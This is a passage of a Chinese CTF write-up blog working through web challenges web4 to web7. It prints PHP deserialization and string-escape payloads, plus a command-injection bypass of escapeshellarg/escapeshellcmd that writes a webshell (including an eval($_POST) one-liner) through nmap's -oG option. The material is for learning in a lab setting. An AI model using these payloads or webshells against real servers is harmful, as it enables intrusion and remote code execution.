<p>payload如下：<code>?text=data://text/plain;base64,ZmxhZyBpcyBoZXJl&amp;file=&amp;file=here.php&amp;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125; </code></p>
<p class='item-img' data-src='image-20230819153821608.png'><img src="image-20230819153821608.png" alt="image-20230819153821608"></p>
<h2 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h2>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>])) &#123;<span class="hljs-comment">//判断是否存在xff头</span><br>    <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>] = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>];<br>&#125;<span class="hljs-comment">//若存在，则将客户端 IP 地址设置为 HTTP_X_FORWARDED_FOR 的值</span><br><br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;host&#x27;</span>])) &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-variable">$host</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;host&#x27;</span>];<br>    <span class="hljs-variable">$host</span> = <span class="hljs-title function_ invoke__">escapeshellarg</span>(<span class="hljs-variable">$host</span>);<span class="hljs-comment">//把字符串转码为可以在 shell 命令里使用的参数</span><br>    <span class="hljs-variable">$host</span> = <span class="hljs-title function_ invoke__">escapeshellcmd</span>(<span class="hljs-variable">$host</span>);<span class="hljs-comment">// shell 元字符转义</span><br>    <span class="hljs-variable">$sandbox</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-string">&quot;glzjin&quot;</span>. <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>]);<br>    <span class="hljs-comment">//代码生成一个名为 $sandbox 的目录名，该目录名是基于 &quot;glzjin&quot; 和客户端 IP 地址的 MD5 散列值。</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;you are in sandbox &#x27;</span>.<span class="hljs-variable">$sandbox</span>;<br>    @<span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$sandbox</span>);<span class="hljs-comment">//在当前工作目录下创建了这个目录，并将工作目录切换到该目录中。</span><br>    <span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-variable">$sandbox</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;</span>.<span class="hljs-variable">$host</span>);<br>    <span class="hljs-comment">//执行了一个 nmap 命令来扫描用户提供的主机，扫描结果会被输出显示。</span><br>&#125;<br></code></pre></td></tr></table></figure>
<p>审了半天不清楚利用点。。。。借助wp吧，太菜了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">escapeshellarg()函数：escapeshellarg() 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，shell 函数包含 exec(), system() 执行运算符(反引号)<br><br>escapeshellcmd()函数：escapeshellcmd() 对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。 此函数保证用户输入的数据在传送到 exec() 或 system() 函数，或者 执行操作符 之前进行转义。<br>反斜线（\）会在以下字符之前插入： &amp;#;`|?~&lt;&gt;^()[]&#123;&#125;$, \x0A 和 \xFF。 *’ 和 “ 仅在不配对儿的时候被转义。 在 Windows 平台上，所有这些字符以及 % 和 ! 字符都会被空格代替。<br></code></pre></td></tr></table></figure>
<p>上述太抽象，测试一番</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span>=<span class="hljs-number">1</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br><span class="hljs-variable">$a</span>=<span class="hljs-title function_ invoke__">escapeshellarg</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br><span class="hljs-variable">$a</span>=<span class="hljs-title function_ invoke__">escapeshellcmd</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='image-20230819155220975.png'><img src="image-20230819155220975.png" alt="image-20230819155220975"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">escapeshellarg()函数将整个字符串加了单引号包裹，并且对单引号进行了转义，转义的单引号也使用了单引号包裹起来，然后用escapeshellcmd()函数进行了转义，成对出现的单引号不转义，对\进行了转义，对最后一个单引号（单个出现）进行了转义<br></code></pre></td></tr></table></figure>
<p>在看</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">传入的参数是：172.17.0.2’ -v -d a=1<br>经过escapeshellarg处理后变成了’172.17.0.2’‘’ -v -d a=1’，即先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。<br>经过escapeshellcmd处理后变成’172.17.0.2’\‘’ -v -d a=1’，这是因为escapeshellcmd对\以及最后那个不配对儿的引号进行了转义：<br>最后执行的命令是curl ‘172.17.0.2’\‘’ -v -d a=1’，由于中间的\被解释为\而不再是转义字符，所以后面的’没有被转义，与再后面的’配对儿成了一个空白连接符。所以可以简化为curl 172.17.0.2\ -v -d a=1’，即向172.17.0.2\发起请求，POST 数据为a=1’。<br></code></pre></td></tr></table></figure>
<p>对ip进行加密，然后创建目录，输出system执行nmap命令后的结果，比如传入127.0.0.1，返回：</p>
<p class='item-img' data-src='image-20230819155509217.png'><img src="image-20230819155509217.png" alt="image-20230819155509217"></p>
<p>框起来的字符就是创建的目录路径<br>
通过查资料得知nmap 中的-oG参数可以将命令和结果写入文件<br>
一般flag都在根目录下，直接使用反引号进行命令执行<br>
构造payload：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">?host=<span class="hljs-string">&#x27; &lt;?php echo `cat /flag`;?&gt; -oG test.php &#x27;</span><br><span class="hljs-comment">//如此写是为了防止那两个函数的转义,详解如下</span><br></code></pre></td></tr></table></figure>
<p>访问该目录下的test.php即可</p>
<p class='item-img' data-src='image-20230819155737184.png'><img src="image-20230819155737184.png" alt="image-20230819155737184"></p>
<p class='item-img' data-src='image-20230819155856891.png'><img src="image-20230819155856891.png" alt="image-20230819155856891"></p>
<p>贴一下大佬的试错：</p>
<pre><code>关于加不加最后的单引号或加不加 单引号前的空格做了结果展示

首先是后面没有加引号

?host=‘ &lt;?php @eval($_POST[&quot;hack&quot;]);?&gt; -oG hack.php我们可以在线测试一下

‘‘\‘‘ &lt;?php phpinfo();?&gt; -oG test.php\‘返回结果是上面那样文件名后面会多一个引号

然后是加引号但引号前没有空格

?host=‘ &lt;?php @eval($_POST[&quot;hack&quot;]);?&gt; -oG hack.php‘ 1

运行结果如下

‘‘\‘‘ &lt;?php phpinfo();?&gt; -oG test.php‘\‘‘‘文件名后面就会多出\

所以要注意细节
</code></pre>
<p>不过这个代码似乎没啥用</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>])) &#123;<span class="hljs-comment">//判断是否存在xff头</span><br>    <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>] = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>];<br></code></pre></td></tr></table></figure>
<h3 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h3>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_26406447/article/details/100711933?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522169243216116800188574432%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=169243216116800188574432&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-100711933-null-null.142%5Ev93%5EchatgptT3_1&amp;utm_term=%5BBUUCTF%202018%5DOnline%20Tool&amp;spm=1018.2226.3001.4187">wp参考</a></p>
<h2 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h2>
<p>简单的php反序列化</p>
<p>index.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment"># @dance.php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">message</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$cai</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$xv</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$kun</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$token</span>=<span class="hljs-string">&#x27;lanqiu&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$c</span>,<span class="hljs-variable">$x</span>,<span class="hljs-variable">$k</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;cai = <span class="hljs-variable">$c</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;xv = <span class="hljs-variable">$x</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;kun = <span class="hljs-variable">$k</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br><span class="hljs-variable">$x</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;x&#x27;</span>];<br><span class="hljs-variable">$k</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;k&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$c</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$x</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$k</span>))&#123;<br>    <span class="hljs-variable">$msg</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">message</span>(<span class="hljs-variable">$c</span>,<span class="hljs-variable">$x</span>,<span class="hljs-variable">$k</span>);<span class="hljs-comment">//该类在dance.php中</span><br>    <span class="hljs-variable">$umsg</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;okok&#x27;</span>, <span class="hljs-string">&#x27;nonoo&#x27;</span>, <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$msg</span>));<span class="hljs-comment">//估计就是字符串逃逸了</span><br>    <span class="hljs-title function_ invoke__">setcookie</span>(<span class="hljs-string">&#x27;msg&#x27;</span>,<span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$umsg</span>));<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Your message has been sent&#x27;</span>;<br>&#125;<br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br></code></pre></td></tr></table></figure>
<p>dance.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">message</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$cai</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$xv</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$kun</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$token</span>=<span class="hljs-string">&#x27;lanqiu&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$c</span>,<span class="hljs-variable">$x</span>,<span class="hljs-variable">$k</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;cai = <span class="hljs-variable">$c</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;xv = <span class="hljs-variable">$x</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;kun = <span class="hljs-variable">$k</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;msg&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$msg</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;msg&#x27;</span>]));<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$msg</span>-&gt;token==<span class="hljs-string">&#x27;sings&#x27;</span>)&#123; <span class="hljs-comment">//令token=sings即可得到flag</span><br>        <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br>    &#125;<br>&#125; <br><span class="hljs-comment">//$umsg = str_replace(&#x27;okok&#x27;, &#x27;nonoo&#x27;, serialize($msg));//估计就是字符串逃逸了</span><br></code></pre></td></tr></table></figure>
<p>这个文件就是关键了，开始测试</p>
<p>token我们不能直接传参，可以通过字符逃逸来完成。这里每一个okok字符串就会多一个字符。</p>
<p>用双引号将其闭合，所以我们可以在$kun赋值为&quot;;s:5:“token”;s:5:“sings”;}，这些就是我们要逃逸的字符，有27个，那么我们就加上27个okok字符串。payload为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">?c=1&amp;x=1&amp;k=okokokokokokokokokokokokokokokokokokokokokokokokokokokokokokokokokokokokokokokokokokokokokokokokokokokokokok&quot;;s:5:&quot;token&quot;;s:5:&quot;sings&quot;;&#125;<br></code></pre></td></tr></table></figure>
<h2 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h2>
<p class='item-img' data-src='image-20230819163146931.png'><img src="image-20230819163146931.png" alt="image-20230819163146931"></p>
<p>又是原p！！！，查看源代码也没啥信息，尝试扫目录</p>
<p class='item-img' data-src='image-20230819163227169.png'><img src="image-20230819163227169.png" alt="image-20230819163227169"></p>
<p>访问看看</p>
<p class='item-img' data-src='image-20230819163237786.png'><img src="image-20230819163237786.png" alt="image-20230819163237786"></p>
<p>没权限</p>
<p class='item-img' data-src='image-20230819163250381.png'><img src="image-20230819163250381.png" alt="image-20230819163250381"></p>
<p>有点懵，给了个序列化字符串，不知道啥意思，那就抓包看有啥惊喜</p>
<p class='item-img' data-src='image-20230819163338651.png'><img src="image-20230819163338651.png" alt="image-20230819163338651"></p>
<p>有点可疑，与序列化字符串相对应，尝试更换一下</p>
<p class='item-img' data-src='image-20230819163358226.png'><img src="image-20230819163358226.png" alt="image-20230819163358226"></p>
<p>得到base64，接下来反转一下解码即可</p>
<p class='item-img' data-src='image-20230819163415246.png'><img src="image-20230819163415246.png" alt="image-20230819163415246"></p>
<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2023/08/21/very_easy_sql/">← Next 攻防世界-very_easy_sql</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2023/08/18/fakebook/">攻防世界-fakebook Prev →</a></div></div></div><div id="comments"><div id="waline"></div></div></div><div class="bottom-btn"><div><a class="i-top" id="to-top" onClick="scrolls.scrolltop();" title="To Top" style="opacity: 0; display: none;">∧</a><a class="i-index" id="to-index" href="#toc-div" title="To Catalog">≡</a><a class="i-color" id="color-mode" onClick="colorMode.change()" title="Change Theme"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="https://ak.hypergryph.com/assets/index/images/ak/pc/faction/1.png" alt="Logo"></a><h1 id="Dr"><a href="/">hybcx</a></h1><div id="description"><p></p></div></div><div id="aside-block"><div id="toc-div"><h1>Catalog</h1><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#web1"><span class="toc-number">1.</span> <span class="toc-text">web1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#URL%E7%BC%96%E7%A0%81%E5%8F%96%E5%8F%8D%E7%BB%95%E8%BF%87"><span class="toc-number">1.1.</span> <span class="toc-text">URL编码取反绕过</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web2"><span class="toc-number">2.</span> <span class="toc-text">web2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80%EF%BC%9A%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8"><span class="toc-number">2.1.</span> <span class="toc-text">方法一：反序列化字符串逃逸</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C%EF%BC%9A%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96"><span class="toc-number">2.2.</span> <span class="toc-text">方法二：变量覆盖</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E7%AB%A0%E5%8F%82%E8%80%83%EF%BC%9A"><span class="toc-number">2.3.</span> <span class="toc-text">文章参考：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web3"><span class="toc-number">3.</span> <span class="toc-text">web3</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E4%B8%80%EF%BC%9A"><span class="toc-number">3.1.</span> <span class="toc-text">绕过一：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E4%BA%8C"><span class="toc-number">3.2.</span> <span class="toc-text">绕过二:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E4%B8%89%EF%BC%9A"><span class="toc-number">3.3.</span> <span class="toc-text">绕过三：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E5%9B%9B%EF%BC%9A"><span class="toc-number">3.4.</span> <span class="toc-text">绕过四：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web4"><span class="toc-number">4.</span> <span class="toc-text">web4</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web5"><span class="toc-number">5.</span> <span class="toc-text">web5</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0%EF%BC%9A"><span class="toc-number">5.1.</span> <span class="toc-text">参考文章：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web6"><span class="toc-number">6.</span> <span class="toc-text">web6</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web7"><span class="toc-number">7.</span> <span class="toc-text">web7</span></a></li></ol></div></div><footer><nobr>Published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> Theme <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr>by <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside><div id="shadow-aside"></div></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script type="module">import { init } from 'https://unpkg.com/@waline/client@v2/dist/waline.mjs';
window.waline = init;
</script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {if (document.querySelector('#waline'))
 waline({
   el: '#waline',
   dark: ':root[theme-mode="dark"]',
   serverURL: 'https://waline-blog-iwqdtxise-hybchenxing.vercel.app',
   path: window.location.pathname,
 });document.querySelector('.lg-container')?.remove()
lightGallery(document.getElementById('post-bg'), {
  plugins: [lgZoom,lgThumbnail],
  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
 cacheBust: false,
 selectors: ['title','article','#aside-block','.pjax-js'],
 switches: {'article': Pjax.switches.sideBySide},
 switchesOptions: {
   'article': {
     classNames: {
       remove: "pjax-out",
       add: "pjax-in"
     }
   }
 }
});
document.addEventListener("pjax:complete", reset);reset()})</script></body></html>